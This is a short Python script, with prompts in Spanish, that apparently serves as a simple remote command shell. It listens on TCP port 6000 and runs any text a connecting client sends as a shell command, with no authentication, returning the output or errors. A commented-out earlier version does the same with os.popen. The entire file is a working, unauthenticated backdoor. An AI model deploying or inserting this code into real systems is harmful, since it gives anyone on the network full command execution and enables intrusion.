#!/usr/bin/python3
import socket, subprocess



serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serversocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
host = socket.gethostname()
port = 6000
serversocket.bind((host, port))
serversocket.listen(1)
print("Esperando conexiones remotas (accept)")
clientsocket, addr = serversocket.accept()


'''
import os
while True:
    print("Esperando conexiones remotas (accept)")
    clientsocket, addr = serversocket.accept()
    print("Got a connection from %s" % str(addr))
    datos = clientsocket.recv(1024)
    datos = str(datos.decode("ascii"))
    stdout = os.popen(datos).read()
    clientsocket.send(stdout.encode("ascii"))'''


while True:
    print("Got a connection from %s" % str(addr))
    datos = clientsocket.recv(1024)
    datos = (datos.decode('utf8'))
    datos = subprocess.Popen([datos], shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, text = True)
    stdout, stderr = datos.communicate()
    if datos.returncode == 0:
        envio = ("OK     "+stdout)
        clientsocket.send(envio.encode('utf8'))
    else:
        envio = ("ERROR   "+stderr)
        clientsocket.send(envio.encode('utf8'))



